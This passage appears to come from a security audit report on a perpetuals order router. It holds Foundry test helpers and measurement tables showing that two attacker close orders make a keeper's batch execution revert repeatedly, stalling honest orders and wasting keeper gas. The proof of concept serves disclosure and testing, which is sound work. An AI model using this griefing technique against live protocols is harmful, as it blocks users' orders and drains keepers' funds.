        for (uint256 i; i < 6; ++i) {
            ids[i] = bytes32(i + 1);
        }
    }

    function _victim(
        uint256 i
    ) internal pure returns (address) {
        return i == 0 ? ALICE : i == 1 ? BOB : CAROL;
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _advance(
        uint64 t
    ) internal {
        vm.warp(t);
        vm.roll(block.number + 1);
    }

    function _commitOpen(
        address account,
        uint256 size,
        uint256 margin
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("open", account, ++orderNonce));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = 1; // LONG open: any price
        request.bounds = _bounds();
        vm.prank(account);
        orderId = router.commitOrder(request);
    }

    function _commitClose(
        address account,
        uint256 size
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("close", account, ++orderNonce));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.targetPrice = 1; // LONG close: unattainable bound, so the close fails terminally on slippage
        request.isClose = true;
        request.bounds = _bounds();
        vm.prank(account);
        orderId = router.commitOrder(request);
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory bounds) {
        bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    /// @dev Live v2.0.0 Router configuration, applied through the owner's 72 h timelocked config path.
    function _applyReleaseRouterConfig() internal {
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.maxExecutionWindowSeconds = 60;
        config.orderExecutionStalenessLimit = 60;
        config.liquidationStalenessLimit = 15;
        config.basketMaxConfidenceRatioBps = 10;
        config.orderSettlementWindow = 15;
        config.maxComponentPublishTimeDivergence = 5;
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        config.openOrderExecutionBountyBps = 1;
        config.minOpenOrderExecutionBountyAssets = 10_000;
        config.maxOpenOrderExecutionBountyAssets = 200_000;
        config.positionProtectionTriggerBountyAssets = 200_000;
        config.maxPendingOrders = 5;
        config.minEngineGas = 600_000;
        config.maxPruneOrdersPerCall = 64;
        _setRouterConfig(config);
    }

}
```

</details>

### Observed balances:

| Measurement | Control: honest orders only | With the attacker's two closes |
| --- | ---: | ---: |
| Keeper `executeOrderBatch` result | Executes all 3 honest orders | Reverts `PletherOracle__StoredFeedBehind(feed 1, t1 + 1, t1 + 2)` on every attempt |
| Keeper gas per batch call | 3,776,895 | 4,214,568 / 4,214,601 / 4,214,645 (three attempts) |
| Keeper gas spent with nothing executed | 0 | 12,643,814 |
| Historical parses / Pyth funding | 1 / 2 × `FEE` | none kept (transaction reverted) |
| Honest orders filled | 3 | 0, all `Pending`; queue head unchanged |
| Attacker cost of the two close commits | n/a | 1,969,332 gas; -0.000001 USDG (own carry checkpoint) |

| Keeper fallback after the revert (same payload) | Gas | Parses / Pyth funding | Outcome |
| --- | ---: | ---: | --- |
| Batch the 3 honest orders, then the 2 closes singly | 4,628,626 | 3 / 6 × `FEE` | All 5 terminal; next batch executes normally |
| All 5 orders singly | 4,838,851 | 5 / 10 × `FEE` | All 5 terminal |

| Griefing ratio (keeper gas lost / attacker gas) | Value |
| --- | ---: |
| One reverted keeper attempt | 2.14 |
| Three reverted keeper attempts | 6.42 |
